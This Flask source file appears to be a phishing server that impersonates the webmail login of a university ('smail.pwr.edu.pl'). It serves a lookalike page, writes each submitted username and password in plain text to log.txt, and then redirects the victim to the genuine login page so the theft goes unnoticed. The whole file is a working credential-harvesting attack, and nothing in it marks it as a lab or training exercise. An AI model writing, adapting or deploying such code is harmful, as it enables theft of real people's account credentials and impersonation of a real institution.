from flask import Flask, request, url_for, render_template, redirect
app = Flask(__name__, static_url_path='')


@app.route('/', methods=('GET', 'POST'))
def hello_world():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        with open('log.txt', 'a') as file:
            file.write("user: {}, pass: {}\n".format(username, password))

        return redirect('https://smail.pwr.edu.pl/auth')

    return render_template('smail.html')

if __name__ == "__main__":
    app.run(ssl_context=('certA.csr', 'privkeyA.pem'))